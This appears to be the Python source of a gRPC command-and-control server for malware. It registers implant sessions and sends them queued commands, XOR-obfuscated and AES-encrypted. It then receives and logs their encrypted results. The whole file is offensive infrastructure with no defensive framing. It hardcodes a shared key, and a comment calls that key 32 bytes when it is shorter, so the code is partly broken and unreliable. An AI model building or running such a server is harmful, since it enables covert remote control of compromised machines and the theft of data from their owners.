import asyncio
import grpc
import logging
import threading
from concurrent import futures
from typing import Dict, Optional

from core.logger import get_logger
from core.crypto import aes_encrypt, aes_decrypt
from core.protocols.session_manager import SessionManager
from core.obfuscation import xor_obfuscate, xor_deobfuscate

import proto.c2_pb2 as c2_pb2
import proto.c2_pb2_grpc as c2_pb2_grpc

logger = get_logger("gRPC-C2")
SESSION_MANAGER = SessionManager()
SHARED_SECRET = b"super_secret_32_bytes_key!!"  # 32 байта для AES

class C2Handler(c2_pb2_grpc.C2Servicer):
    def __init__(self):
        self.sessions: Dict[str, Dict[str, str]] = {}

    def Register(self, request: c2_pb2.RegistrationRequest, context) -> c2_pb2.RegistrationResponse:
        session_id = request.session_id
        ip = context.peer()
        logger.info(f"[gRPC-C2] Registration: {session_id} from {ip}")
        SESSION_MANAGER.update_session(session_id, ip)
        return c2_pb2.RegistrationResponse(status="ACK")

    def PullCommand(self, request: c2_pb2.CommandRequest, context) -> c2_pb2.CommandResponse:
        session_id = request.session_id
        logger.debug(f"[gRPC-C2] PullCommand for: {session_id}")
        SESSION_MANAGER.refresh(session_id)

        command = SESSION_MANAGER.pop_command(session_id)
        if not command:
            return c2_pb2.CommandResponse(encrypted_command=b"", session_id=session_id)

        encrypted = aes_encrypt(xor_obfuscate(command).encode(), SHARED_SECRET)
        return c2_pb2.CommandResponse(encrypted_command=encrypted, session_id=session_id)

    def PushResult(self, request: c2_pb2.CommandResult, context) -> c2_pb2.AckResponse:
        session_id = request.session_id
        data = aes_decrypt(request.encrypted_result, SHARED_SECRET)
        decoded = xor_deobfuscate(data.decode(errors="ignore"))

        logger.info(f"[gRPC-C2] Result from {session_id}: {decoded}")
        SESSION_MANAGER.refresh(session_id)
        return c2_pb2.AckResponse(status="RECEIVED")

def serve(bind_ip="0.0.0.0", port=50051):
    server = grpc.server(futures.ThreadPoolExecutor(max_workers=20))
    c2_pb2_grpc.add_C2Servicer_to_server(C2Handler(), server)
    server.add_insecure_port(f"{bind_ip}:{port}")
    server.start()
    logger.info(f"[gRPC-C2] Listening on {bind_ip}:{port}")
    server.wait_for_termination()

if __name__ == "__main__":
    serve()
